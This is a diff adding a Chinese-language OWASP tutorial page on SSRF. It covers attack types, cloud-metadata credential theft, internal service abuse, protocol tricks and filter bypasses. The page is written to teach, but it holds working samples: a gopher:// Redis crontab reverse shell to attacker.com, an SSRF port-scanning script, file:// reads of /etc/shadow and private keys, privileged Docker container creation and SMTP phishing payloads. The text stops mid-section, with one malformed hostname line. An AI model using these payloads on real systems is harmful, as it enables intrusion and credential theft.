@@ -1,0 +1,1332 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>A10: SSRF 服务端请求伪造 - OWASP Top 10</title>
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page-wrapper">
+  <nav class="sidebar">
+    <h2>OWASP Top 10</h2>
+    <ul>
+      <li><a href="A01_权限控制失效.html">A01: 权限控制失效</a></li>
+      <li><a href="A02_加密机制失效.html">A02: 加密机制失效</a></li>
+      <li><a href="A03_注入攻击.html">A03: 注入攻击</a></li>
+      <li><a href="A04_不安全设计.html">A04: 不安全设计</a></li>
+      <li><a href="A05_安全配置错误.html">A05: 安全配置错误</a></li>
+      <li><a href="A06_过时组件.html">A06: 过时组件</a></li>
+      <li><a href="A07_认证失效.html">A07: 认证失效</a></li>
+      <li><a href="A08_软件完整性失效.html">A08: 软件完整性失效</a></li>
+      <li><a href="A09_日志监控失效.html">A09: 日志监控失效</a></li>
+      <li><a href="A10_SSRF.html" class="active">A10: SSRF</a></li>
+    </ul>
+    <h2>本页目录</h2>
+    <ul>
+      <li><a href="#overview">SSRF 概述</a></li>
+      <li><a href="#types">SSRF 类型分类</a></li>
+      <li><a href="#attack-scenarios">攻击场景与图解</a></li>
+      <li><a href="#protocols">协议利用方式</a></li>
+      <li><a href="#bypass">绕过技术</a></li>
+      <li><a href="#defense">防御方案</a></li>
+    </ul>
+    <h2>导航</h2>
+    <ul>
+      <li><a href="../index.html">返回首页</a></li>
+    </ul>
+  </nav>
+
+  <main class="main-content">
+    <div class="breadcrumb">
+      <a href="../index.html">首页</a> / <a href="A01_权限控制失效.html">OWASP Top 10</a> / A10: SSRF 服务端请求伪造
+    </div>
+
+    <h1>A10:2021 - 服务端请求伪造 (Server-Side Request Forgery, SSRF)</h1>
+    <p><span class="tag high">HIGH</span> <span class="tag">排名第10</span> <span class="tag">2021年新增</span></p>
+    <p>SSRF 是 2021 年 OWASP Top 10 <strong>全新加入</strong>的漏洞类别。随着云原生架构普及、微服务内部通信增多，SSRF 的危害被急剧放大——攻击者可以利用服务端作为"跳板"，访问原本无法触及的内部网络资源。</p>
+
+    <div class="info-box danger">
+      <div class="box-title">为什么 SSRF 在云时代尤其危险？</div>
+      <p>云环境中，实例的元数据服务（如 AWS 的 169.254.169.254）暴露了 IAM 临时凭证、实例配置等敏感信息。一次 SSRF 就可能导致整个云账户被接管。2019 年 Capital One 数据泄露事件正是通过 SSRF 获取 AWS 临时凭证，最终导致 1 亿用户数据泄露。</p>
+    </div>
+
+    <!-- Section 1 -->
+    <h2 id="overview">1. SSRF 概述</h2>
+
+    <h3>1.1 什么是 SSRF？</h3>
+    <p>SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者能够<strong>诱使服务端应用向攻击者指定的任意地址发起请求</strong>。服务端充当了攻击者的"代理人"，代替攻击者发起网络请求。</p>
+
+    <div class="diagram">SSRF 攻击模型：
+
+┌─────────────┐         ┌─────────────────┐         ┌─────────────────┐
+│   攻击者    │────────→│   目标Web服务器  │────────→│   内部资源       │
+│  (外部网络)  │  HTTP   │  (有漏洞的应用)  │  SSRF   │  (被防火墙保护)  │
+└─────────────┘         └─────────────────┘         └─────────────────┘
+                                │
+                                │ 正常流量：从外部无法访问内部资源
+                                │ SSRF：借用服务器的"身份"访问内部资源
+                                ▼
+                    ┌───────────────────────────┐
+                    │   防火墙 / 网络边界        │
+                    │   对外部请求：拒绝 ✗       │
+                    │   对服务器请求：允许 ✓     │
+                    └───────────────────────────┘
+
+关键点：
+  - 攻击者自己无法直接访问内部网络
+  - 但服务器在内部网络中，拥有访问权限
+  - 攻击者利用服务器作为"跳板"来访问内部资源
+  - 服务器"被动"地替攻击者发起请求</div>
+
+    <h3>1.2 SSRF 产生的根本原因</h3>
+    <p>应用程序接受用户提供的 URL 或地址参数，并在服务端发起网络请求，但<strong>未对目标地址进行充分验证</strong>。常见场景包括：</p>
+
+    <table>
+      <thead><tr><th>功能场景</th><th>正常用途</th><th>如何被滥用</th></tr></thead>
+      <tbody>
+        <tr><td>URL 预览/分享</td><td>获取网页标题、缩略图</td><td>将 URL 指向内部地址</td></tr>
+        <tr><td>文件下载/导入</td><td>从远程 URL 下载文件</td><td>下载内部文件或服务响应</td></tr>
+        <tr><td>Webhook 回调</td><td>通知第三方系统</td><td>回调地址指向内部服务</td></tr>
+        <tr><td>PDF 生成</td><td>将 HTML 渲染为 PDF</td><td>HTML 中引用内部资源</td></tr>
+        <tr><td>图片处理</td><td>从 URL 加载图片缩放</td><td>URL 指向内部 API</td></tr>
+        <tr><td>代理/转发功能</td><td>API 聚合网关</td><td>转发请求到内部服务</td></tr>
+        <tr><td>RSS/Feed 订阅</td><td>拉取 RSS 内容</td><td>订阅内部地址</td></tr>
+      </tbody>
+    </table>
+
+    <h3>1.3 真实案例：Capital One 2019</h3>
+
+    <div class="info-box warning">
+      <div class="box-title">案例：Capital One 数据泄露（2019年7月）</div>
+      <p><strong>影响：</strong>1 亿美国用户 + 600 万加拿大用户的个人信息泄露</p>
+      <p><strong>罚款：</strong>8000 万美元</p>
+      <p><strong>攻击链：</strong></p>
+      <ol>
+        <li>攻击者发现 Capital One WAF（ModSecurity）存在 SSRF 漏洞</li>
+        <li>通过 SSRF 访问 AWS 元数据服务 <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
+        <li>获取了 IAM Role 的临时 Access Key / Secret Key / Session Token</li>
+        <li>使用这些凭证访问 S3 存储桶，下载了大量客户数据</li>
+      </ol>
+    </div>
+
+    <pre><code># Capital One 攻击还原（简化）
+
+# Step 1: 攻击者发送精心构造的请求
+curl -X POST https://capitalone-waf.example.com/ \
+  -H "Host: 169.254.169.254" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role"
+
+# Step 2: 服务器返回了 IAM 临时凭证
+{
+  "Code": "Success",
+  "AccessKeyId": "ASIAXXX...",
+  "SecretAccessKey": "wJalrXX...",
+  "Token": "FwoGZXIvYXdzEBYaD...",
+  "Expiration": "2019-03-XX"
+}
+
+# Step 3: 攻击者使用凭证列出 S3 桶
+aws s3 ls --profile stolen-creds
+
+# Step 4: 下载数据
+aws s3 sync s3://capital-one-customer-data ./stolen/ --profile stolen-creds</code></pre>
+
+    <!-- Section 2 -->
+    <h2 id="types">2. SSRF 类型分类</h2>
+
+    <h3>2.1 基本 SSRF（Full SSRF / In-band SSRF）</h3>
+    <p>服务器发起请求后，<strong>将响应内容直接返回给攻击者</strong>。攻击者可以完整读取内部服务的响应。</p>
+
+    <pre><code># 典型漏洞代码 (Python Flask)
+@app.route('/fetch')
+def fetch_url():
+    url = request.args.get('url')
+    # 未验证 URL，直接请求并返回内容
+    response = requests.get(url)
+    return response.text
+
+# 正常使用
+GET /fetch?url=https://example.com/api/data
+
+# SSRF 攻击 - 读取内部服务
+GET /fetch?url=http://192.168.1.100:8080/admin/users
+# → 返回内部管理后台的用户列表！
+
+# SSRF 攻击 - 读取云元数据
+GET /fetch?url=http://169.254.169.254/latest/meta-data/
+# → 返回 AWS 实例元数据！</code></pre>
+
+    <div class="diagram">Full SSRF 数据流：
+
+攻击者                    目标服务器                    内部Redis
+  │                          │                           │
+  │  GET /fetch?url=         │                           │
+  │  http://redis:6379/      │                           │
+  │─────────────────────────→│                           │
+  │                          │  连接 redis:6379          │
+  │                          │──────────────────────────→│
+  │                          │                           │
+  │                          │  返回 Redis 信息          │
+  │                          │←──────────────────────────│
+  │                          │                           │
+  │  HTTP 200               │                           │
+  │  Body: Redis 响应内容    │                           │
+  │←─────────────────────────│                           │
+  │                          │                           │
+
+攻击者可以直接看到内部服务的响应内容 → 最危险的 SSRF 类型</div>
+
+    <h3>2.2 Blind SSRF（盲 SSRF）</h3>
+    <p>服务器发起请求，但<strong>不将响应内容返回给攻击者</strong>。攻击者无法直接看到内部服务的响应，需要通过间接方式探测。</p>
+
+    <pre><code># Blind SSRF 漏洞代码
+@app.route('/webhook', methods=['POST'])
+def set_webhook():
+    url = request.json.get('callback_url')
+    # 服务器会访问这个 URL，但不返回响应内容给用户
+    try:
+        requests.get(url, timeout=3)
+        return jsonify({"status": "webhook registered"})
+    except:
+        return jsonify({"status": "webhook registered"})  # 无论成败都返回相同信息
+
+# 攻击者无法看到响应内容，但可以：
+
+# 方法1: 时间差探测
+# 请求存在的内部服务 → 快速返回
+# 请求不存在的服务 → 超时后返回
+import time
+
+ports = [22, 80, 443, 3306, 6379, 8080, 9200]
+for port in ports:
+    start = time.time()
+    requests.post('http://target.com/webhook', json={
+        'callback_url': f'http://192.168.1.1:{port}/'
+    })
+    elapsed = time.time() - start
+    if elapsed < 1:  # 快速响应 = 端口开放
+        print(f"[OPEN] Port {port}")
+    else:            # 超时 = 端口关闭或被过滤
+        print(f"[CLOSED/FILTERED] Port {port}")
+
+# 方法2: DNS 外带（Out-of-Band）
+# 让目标服务器解析攻击者控制的域名
+callback_url = "http://ssrf-test.attacker-dns-server.com/"
+# 如果攻击者的 DNS 服务器收到解析请求 → 确认 SSRF 存在
+
+# 方法3: 利用 Burp Collaborator / interactsh
+callback_url = "http://xyz123.burpcollaborator.net/"</code></pre>
+
+    <h3>2.3 Semi-blind SSRF（半盲 SSRF）</h3>
+    <p>响应体不返回，但<strong>通过错误信息、状态码或响应时间泄露部分信息</strong>。</p>
+
+    <pre><code># 半盲 SSRF - 错误信息泄露
+@app.route('/check-url')
+def check_url():
+    url = request.args.get('url')
+    try:
+        resp = requests.get(url, timeout=5)
+        return jsonify({"reachable": True, "status_code": resp.status_code})
+    except requests.exceptions.ConnectionError as e:
+        return jsonify({"reachable": False, "error": str(e)})  # 泄露错误详情！
+    except requests.exceptions.Timeout:
+        return jsonify({"reachable": False, "error": "timeout"})
+
+# 攻击者可以获取的信息：
+# - status_code 泄露内部服务状态
+# - 错误信息可能包含内部 IP、端口状态、Banner 信息
+
+# 示例响应：
+# GET /check-url?url=http://192.168.1.50:3306/
+# → {"reachable": false, "error": "Connection refused"}  ← 端口关闭
+#
+# GET /check-url?url=http://192.168.1.50:6379/
+# → {"reachable": true, "status_code": 200}  ← Redis 开放！
+#
+# GET /check-url?url=http://192.168.1.50:9200/
+# → {"reachable": true, "status_code": 200}  ← Elasticsearch 开放！</code></pre>
+
+    <h3>2.4 SSRF 类型对比</h3>
+    <table>
+      <thead><tr><th>类型</th><th>响应可见性</th><th>危害程度</th><th>利用难度</th><th>典型场景</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Full SSRF</strong></td><td>完整响应返回</td><td>极高</td><td>低</td><td>URL 预览、文件下载、代理功能</td></tr>
+        <tr><td><strong>Semi-blind</strong></td><td>状态码/错误信息</td><td>高</td><td>中</td><td>URL 校验、连通性检查</td></tr>
+        <tr><td><strong>Blind SSRF</strong></td><td>完全不可见</td><td>中</td><td>高</td><td>Webhook、异步回调、日志系统</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 3 -->
+    <h2 id="attack-scenarios">3. 攻击场景与图解</h2>
+
+    <h3>3.1 场景一：窃取云元数据（Cloud Metadata）</h3>
+    <p>这是当前 SSRF 攻击中<strong>最高频、最危险</strong>的场景。几乎所有云厂商都提供实例元数据服务（IMDS），该服务通过 Link-Local 地址暴露敏感信息。</p>
+
+    <div class="info-box danger">
+      <div class="box-title">各云厂商元数据端点</div>
+      <table>
+        <thead><tr><th>云厂商</th><th>元数据地址</th><th>关键数据路径</th></tr></thead>
+        <tbody>
+          <tr><td><strong>AWS</strong></td><td><code>http://169.254.169.254</code></td><td><code>/latest/meta-data/iam/security-credentials/[role-name]</code></td></tr>
+          <tr><td><strong>GCP</strong></td><td><code>http://metadata.google.internal</code></td><td><code>/computeMetadata/v1/instance/service-accounts/default/token</code></td></tr>
+          <tr><td><strong>Azure</strong></td><td><code>http://169.254.169.254</code></td><td><code>/metadata/instance?api-version=2021-02-01</code></td></tr>
+          <tr><td><strong>阿里云</strong></td><td><code>http://100.100.100.200</code></td><td><code>/latest/meta-data/ram/security-credentials/[role-name]</code></td></tr>
+          <tr><td><strong>DigitalOcean</strong></td><td><code>http://169.254.169.254</code></td><td><code>/metadata/v1/</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <pre><code># AWS 元数据完整利用链
+
+# 1. 获取实例基本信息
+GET /fetch?url=http://169.254.169.254/latest/meta-data/
+→ ami-id, hostname, instance-id, instance-type, local-ipv4, public-ipv4...
+
+# 2. 获取 IAM Role 名称
+GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+→ MyEC2Role
+
+# 3. 获取临时凭证
+GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
+→ {
+    "Code": "Success",
+    "AccessKeyId": "ASIAXXXXXXXXXXX",
+    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+    "Token": "IQoJb3JpZ2luX2VjEJr...",
+    "Expiration": "2024-01-15T12:00:00Z"
+  }
+
+# 4. 获取 User Data（可能包含启动脚本中的密码/密钥）
+GET /fetch?url=http://169.254.169.254/latest/user-data
+→ #!/bin/bash
+  export DB_PASSWORD="super_secret_123"
+  export API_KEY="sk-xxxxx"
+
+# GCP 元数据（需要特定 Header，但某些 SSRF 可以设置）
+# 注意: GCP 要求 Metadata-Flavor: Google header
+GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+Header: Metadata-Flavor: Google
+→ {"access_token":"ya29.XXXXX","expires_in":3599,"token_type":"Bearer"}
+
+# Azure 元数据
+GET /fetch?url=http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
+Header: Metadata: true
+→ 实例信息、订阅ID、资源组等</code></pre>
+
+    <div class="diagram">SSRF 窃取云凭证攻击链：
+
+┌──────────┐    ①构造SSRF请求     ┌──────────────┐
+│  攻击者   │───────────────────→ │  EC2 实例     │
+│          │                      │  (Web应用)    │
+└──────────┘                      └──────┬───────┘
+                                         │
+                                         │ ②服务端请求
+                                         │ http://169.254.169.254/...
+                                         ▼
+                                  ┌──────────────┐
+                                  │  IMDS 元数据  │
+                                  │  服务         │
+                                  └──────┬───────┘
+                                         │
+                                         │ ③返回IAM临时凭证
+┌──────────┐    ④凭证返回给攻击者  │
+│  攻击者   │←──────────────────── │
+│          │                      ▼
+└────┬─────┘
+     │
+     │ ⑤使用窃取的凭证
+     │ aws s3 ls / aws ec2 describe-instances
+     ▼
+┌─────────────────────────────────────┐
+│          AWS 云服务                    │
+│  S3 / EC2 / RDS / Lambda / ...      │
+│  → 完全以 EC2 Role 权限操作！        │
+└─────────────────────────────────────┘</div>
+
+    <h3>3.2 场景二：内网端口扫描</h3>
+    <p>通过 SSRF 对内部网络进行端口扫描，探测内部服务架构。</p>
+
+    <pre><code># 利用 SSRF 进行内网扫描（Python 自动化）
+import requests
+import time
+import concurrent.futures
+
+TARGET = "http://vulnerable-app.com/fetch"
+
+def scan_port(ip, port):
+    """利用 SSRF 扫描单个端口"""
+    url = f"http://{ip}:{port}/"
+    try:
+        start = time.time()
+        resp = requests.get(TARGET, params={'url': url}, timeout=10)
+        elapsed = time.time() - start
+
+        # 判断端口状态的方法
+        if resp.status_code == 200 and len(resp.text) > 0:
+            return (ip, port, "OPEN", resp.text[:100])
+        elif elapsed > 5:
+            return (ip, port, "FILTERED", "timeout")
+        else:
+            return (ip, port, "CLOSED", "")
+    except:
+        return (ip, port, "ERROR", "")
+
+# 扫描常见内部服务端口
+COMMON_PORTS = {
+    22: "SSH",
+    80: "HTTP",
+    443: "HTTPS",
+    3306: "MySQL",
+    5432: "PostgreSQL",
+    6379: "Redis",
+    9200: "Elasticsearch",
+    8080: "HTTP-Alt",
+    8443: "HTTPS-Alt",
+    27017: "MongoDB",
+    11211: "Memcached",
+    2379: "etcd",
+    8500: "Consul",
+    5601: "Kibana",
+    9090: "Prometheus"
+}
+
+# 扫描 192.168.1.0/24 网段
+results = []
+with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+    futures = []
+    for ip_suffix in range(1, 255):
+        ip = f"192.168.1.{ip_suffix}"
+        for port in COMMON_PORTS:
+            futures.append(executor.submit(scan_port, ip, port))
+
+    for future in concurrent.futures.as_completed(futures):
+        result = future.result()
+        if result[2] == "OPEN":
+            print(f"[+] {result[0]}:{result[1]} ({COMMON_PORTS.get(result[1], '?')}) - OPEN")
+            print(f"    Response: {result[3]}")
+            results.append(result)</code></pre>
+
+    <h3>3.3 场景三：攻击内部服务</h3>
+
+    <h4>3.3.1 攻击内部 Redis</h4>
+    <pre><code># Redis 通常绑定在内网且无认证
+# 通过 SSRF 直接与 Redis 通信
+
+# 利用 HTTP 协议向 Redis 发送命令（Redis 容错性强，会忽略无效行）
+GET /fetch?url=http://192.168.1.10:6379/
+
+# Redis 响应可能包含:
+# -ERR wrong number of arguments for 'get' command
+# $-1
+# → 确认 Redis 存在
+
+# 如果是 Full SSRF，可以通过特殊构造读取数据
+# 利用 CRLF 注入向 Redis 发送多条命令（需要支持的场景）
+
+# 更强大的方式：使用 gopher:// 协议（见第4节）</code></pre>
+
+    <h4>3.3.2 攻击内部 Elasticsearch</h4>
+    <pre><code># Elasticsearch 默认在 9200 端口，通常无认证
+
+# 获取集群信息
+GET /fetch?url=http://192.168.1.20:9200/
+→ {"name":"es-node-1","cluster_name":"production","version":{"number":"7.x"}}
+
+# 列出所有索引
+GET /fetch?url=http://192.168.1.20:9200/_cat/indices?v
+→ health status index     pri rep docs.count
+   green  open   users     1   1   50000
+   green  open   orders    1   1   120000
+   green  open   logs      1   1   5000000
+
+# 搜索敏感数据
+GET /fetch?url=http://192.168.1.20:9200/users/_search?q=admin
+→ 返回包含 admin 的用户文档
+
+# 导出全部数据
+GET /fetch?url=http://192.168.1.20:9200/users/_search?size=10000</code></pre>
+
+    <h4>3.3.3 攻击内部 API / 管理后台</h4>
+    <pre><code># 内部管理 API 通常没有认证（信任内网来源）
+
+# 访问 Kubernetes API
+GET /fetch?url=https://kubernetes.default.svc/api/v1/namespaces/default/secrets
+→ 返回所有 Kubernetes Secrets！
+
+# 访问 Docker API
+GET /fetch?url=http://192.168.1.5:2375/containers/json
+→ 列出所有运行中的容器
+
+# 创建特权容器（RCE）
+POST /fetch?url=http://192.168.1.5:2375/containers/create
+Body: {"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}
+
+# 访问内部管理后台
+GET /fetch?url=http://internal-admin.corp:8080/admin/users
+GET /fetch?url=http://192.168.1.100:3000/grafana/api/admin/settings
+GET /fetch?url=http://consul.service:8500/v1/kv/?recurse</code></pre>
+
+    <h3>3.4 场景四：读取本地文件</h3>
+    <pre><code># 使用 file:// 协议读取服务器本地文件
+
+# 读取系统文件
+GET /fetch?url=file:///etc/passwd
+GET /fetch?url=file:///etc/shadow         # 需要 root 权限
+GET /fetch?url=file:///etc/hosts          # 发现内部主机名
+GET /fetch?url=file:///proc/net/tcp       # 发现内部网络连接
+GET /fetch?url=file:///proc/self/environ  # 环境变量（可能含密钥）
+GET /fetch?url=file:///proc/self/cmdline  # 进程启动命令
+
+# 读取应用配置文件
+GET /fetch?url=file:///var/www/html/.env
+GET /fetch?url=file:///app/config/database.yml
+GET /fetch?url=file:///root/.ssh/id_rsa   # SSH 私钥
+GET /fetch?url=file:///root/.aws/credentials  # AWS 凭证文件
+
+# 读取 Docker 环境信息
+GET /fetch?url=file:///proc/self/cgroup   # 确认是否在容器中
+GET /fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token  # K8s SA Token</code></pre>
+
+    <!-- Section 4 -->
+    <h2 id="protocols">4. SSRF 协议利用方式</h2>
+
+    <h3>4.1 支持的协议概览</h3>
+    <table>
+      <thead><tr><th>协议</th><th>用途</th><th>危害</th><th>常见库支持</th></tr></thead>
+      <tbody>
+        <tr><td><code>http://</code> / <code>https://</code></td><td>标准 Web 请求</td><td>访问内部 Web 服务、API</td><td>所有 HTTP 库</td></tr>
+        <tr><td><code>file://</code></td><td>读取本地文件</td><td>读取敏感配置、密钥文件</td><td>cURL, Java URL, PHP</td></tr>
+        <tr><td><code>dict://</code></td><td>字典服务协议</td><td>探测端口、与 Redis 交互</td><td>cURL, PHP</td></tr>
+        <tr><td><code>gopher://</code></td><td>通用 TCP 协议</td><td>构造任意 TCP 数据包</td><td>cURL, PHP(旧版), Java</td></tr>
+        <tr><td><code>ftp://</code></td><td>文件传输</td><td>读取文件、端口扫描</td><td>cURL, Java, PHP</td></tr>
+        <tr><td><code>ldap://</code></td><td>目录服务</td><td>信息泄露</td><td>Java, PHP</td></tr>
+        <tr><td><code>tftp://</code></td><td>简单文件传输</td><td>向外传输数据</td><td>cURL</td></tr>
+      </tbody>
+    </table>
+
+    <h3>4.2 dict:// 协议</h3>
+    <pre><code># dict:// 协议可以向指定端口发送一行数据
+# 格式: dict://host:port/command
+
+# 探测 Redis
+GET /fetch?url=dict://192.168.1.10:6379/INFO
+→ 返回 Redis INFO 信息（版本、内存使用、连接数等）
+
+# 获取 Redis 中的数据
+GET /fetch?url=dict://192.168.1.10:6379/GET:secret_key
+
+# 向 Redis 写入数据
+GET /fetch?url=dict://192.168.1.10:6379/SET:pwned:true
+
+# 局限性：dict:// 每次只能发送一行命令
+# 无法执行需要多行的复杂操作</code></pre>
+
+    <h3>4.3 gopher:// 协议（SSRF 核武器）</h3>
+
+    <div class="info-box warning">
+      <div class="box-title">gopher:// — 最强大的 SSRF 协议</div>
+      <p>gopher:// 协议允许构造<strong>任意 TCP 数据包</strong>，可以模拟几乎任何基于 TCP 的协议通信。这使得攻击者可以通过 SSRF 与 Redis、MySQL、SMTP、FastCGI 等服务进行完整交互。</p>
+    </div>
+
+    <pre><code># gopher:// 协议格式
+# gopher://host:port/_[TCP数据流(URL编码)]
+
+# === 利用 gopher:// 攻击 Redis ===
+
+# 目标：通过 Redis 写入 Crontab 获取反弹 Shell
+
+# 原始 Redis 命令：
+# FLUSHALL
+# SET mykey "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1\n\n"
+# CONFIG SET dir /var/spool/cron/
+# CONFIG SET dbfilename root
+# SAVE
+# QUIT
+
+# 转换为 gopher 载荷（每行末尾加 \r\n，整体 URL 编码）：
+gopher://192.168.1.10:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%245%0D%0Amykey%0D%0A%2461%0D%0A%0A%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A
+
+# === 利用 gopher:// 攻击 MySQL ===
+# MySQL 认证过程中，如果用户无密码，可以直接发送查询
+# 需要知道 MySQL 协议的握手格式
+
+# 工具: Gopherus (自动生成 gopher payload)
+# https://github.com/tarunkant/Gopherus
+
+python gopherus.py --exploit mysql
+# 输入目标用户: root
+# 输入SQL查询: SELECT * FROM mysql.user
+
+# 生成的 gopher:// URL 可直接用于 SSRF
+
+# === 利用 gopher:// 攻击 FastCGI (PHP-FPM) ===
+# 如果 PHP-FPM 监听在 TCP 端口（如 9000），可以通过构造 FastCGI 请求执行任意 PHP 代码
+
+python gopherus.py --exploit fastcgi
+# 输入PHP文件路径: /var/www/html/index.php
+# 输入命令: id
+
+# === 利用 gopher:// 发送 SMTP 邮件 ===
+# 通过内部邮件服务器发送钓鱼邮件
+gopher://internal-smtp:25/_HELO%20attacker%0D%0AMAIL%20FROM%3A%3Cadmin%40company.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40company.com%3E%0D%0ADATA%0D%0ASubject%3A%20Password%20Reset%0D%0A%0D%0AClick%20here%3A%20http%3A%2F%2Fattacker.com%2Fphish%0D%0A.%0D%0AQUIT</code></pre>
+
+    <div class="diagram">gopher:// 攻击 Redis 获取 Shell 流程：
+
+攻击者                    Web服务器                    Redis (内网)
+  │                          │                           │
+  │  SSRF: gopher://         │                           │
+  │  redis:6379/_payload     │                           │
+  │─────────────────────────→│                           │
+  │                          │                           │
+  │                          │  TCP 连接 (伪造Redis协议) │
+  │                          │  FLUSHALL                 │
+  │                          │  SET key "crontab内容"    │
+  │                          │  CONFIG SET dir /cron/    │
+  │                          │  CONFIG SET dbfilename    │
+  │                          │  SAVE                     │
+  │                          │──────────────────────────→│
+  │                          │                           │
+  │                          │         OK                │
+  │                          │←──────────────────────────│
+  │                          │                           │
+  │  "请求完成"              │        Redis 写入         │
+  │←─────────────────────────│        /var/spool/cron/root
+  │                          │                           │
+  │                                                      │
+  │  等待 Cron 执行...                                   │
+  │                                                      │
+  │←─────── 反弹 Shell 连接 ─────────────────────────────│
+  │         bash -i >& /dev/tcp/attacker/4444            │
+  │                                                      │</div>
+
+    <h3>4.4 协议利用能力对比</h3>
+    <table>
+      <thead><tr><th>能力</th><th>http(s)</th><th>file</th><th>dict</th><th>gopher</th><th>ftp</th></tr></thead>
+      <tbody>
+        <tr><td>读取本地文件</td><td>✗</td><td>✓</td><td>✗</td><td>✗</td><td>✗</td></tr>
+        <tr><td>访问内网HTTP</td><td>✓</td><td>✗</td><td>✗</td><td>✓</td><td>✗</td></tr>
+        <tr><td>端口探测</td><td>✓</td><td>✗</td><td>✓</td><td>✓</td><td>✓</td></tr>
+        <tr><td>发送单行命令</td><td>✗</td><td>✗</td><td>✓</td><td>✓</td><td>✗</td></tr>
+        <tr><td>发送多行/复杂协议</td><td>✗</td><td>✗</td><td>✗</td><td>✓</td><td>✗</td></tr>
+        <tr><td>攻击Redis</td><td>有限</td><td>✗</td><td>单命令</td><td>完整</td><td>✗</td></tr>
+        <tr><td>攻击MySQL</td><td>✗</td><td>✗</td><td>✗</td><td>✓(无密码)</td><td>✗</td></tr>
+        <tr><td>攻击SMTP</td><td>✗</td><td>✗</td><td>✗</td><td>✓</td><td>✗</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 5 -->
+    <h2 id="bypass">5. SSRF 绕过技术</h2>
+
+    <p>当应用实施了 URL 过滤/黑名单时，攻击者可以通过多种手法绕过限制。</p>
+
+    <h3>5.1 IP 地址的等价表示</h3>
+    <pre><code># 目标: 访问 127.0.0.1（localhost）
+# 但应用过滤了 "127.0.0.1" 和 "localhost"
+
+# === 十进制整数表示 ===
+# 127.0.0.1 = 127*256^3 + 0*256^2 + 0*256 + 1 = 2130706433
+http://2130706433/           # 十进制整数
+
+# === 十六进制表示 ===
+http://0x7f000001/           # 完整十六进制
+http://0x7f.0x0.0x0.0x1/    # 分段十六进制
+
+# === 八进制表示 ===
+http://0177.0.0.01/          # 八进制
+http://0177.0000.0000.0001/  # 八进制（前导零）
+
+# === 混合进制 ===
+http://0x7f.0.0.1/           # 十六进制+十进制
+http://0177.0.0.0x1/         # 八进制+十六进制
+
+# === IPv6 表示 ===
+http://[::1]/                 # IPv6 localhost
+http://[0:0:0:0:0:0:0:1]/   # IPv6 完整形式
+http://[::ffff:127.0.0.1]/   # IPv4-mapped IPv6
+http://[0:0:0:0:0:ffff:7f00:1]/  # 另一种形式
+
+# === 特殊域名 ===
+http://127.1/                 # 省略中间的 0
+http://127.0.1/              # 省略一个 0
+http://0/                    # 某些系统等于 0.0.0.0
+http://0.0.0.0/              # 在某些环境等同于 localhost
+
+# === 目标: 访问 169.254.169.254 (AWS 元数据) ===
+http://2852039166/                    # 十进制
+http://0xa9fea9fe/                    # 十六进制
+http://0251.0376.0251.0376/           # 八进制
+http://[::ffff:a9fe:a9fe]/            # IPv6
+http://169.254.169.254.nip.io/        # 通配符 DNS（见下文）</code></pre>
+
+    <h3>5.2 DNS Rebinding 攻击</h3>
+
+    <div class="info-box warning">
+      <div class="box-title">DNS Rebinding 原理</div>
+      <p>当应用先解析域名验证 IP 是否合法，再用该域名发起请求时，攻击者可以利用 DNS TTL 极短的特性：第一次解析返回合法 IP（通过验证），第二次解析返回内网 IP（实际请求）。</p>
+    </div>
+
+    <div class="diagram">DNS Rebinding 攻击流程：
+
+应用的验证逻辑：
+  1. 接收用户输入的URL: http://evil.attacker.com/path
+  2. DNS解析 evil.attacker.com → 得到IP
+  3. 检查IP是否为内网地址？ 不是 → 放行
+  4. 发起实际HTTP请求到 evil.attacker.com
+
+攻击者的 DNS 服务器配置：
+  evil.attacker.com  TTL=0
+  第1次查询 → 返回 8.8.8.8 (合法外网IP，通过验证)
+  第2次查询 → 返回 169.254.169.254 (内网元数据！)
+
+时间线：
+  t=0  应用收到 URL: http://evil.attacker.com/meta
+  t=1  DNS查询 #1 → 8.8.8.8 (外网，合法) ✓ 通过验证
+  t=2  DNS缓存过期 (TTL=0)
+  t=3  发起HTTP请求，DNS查询 #2 → 169.254.169.254
+  t=4  实际连接到 169.254.169.254 → 获取元数据！
+
+关键条件：
+  - DNS TTL 设为 0 或极短
+  - 应用在验证和请求之间有时间差
+  - 应用不缓存DNS结果或缓存时间极短</div>
+
+    <pre><code># DNS Rebinding 工具和服务
+
+# 1. 使用 rbndr.us 服务
+# 格式: [IP1].[IP2].rbndr.us → 交替返回两个IP
+http://7f000001.a]9fea9fe.rbndr.us/
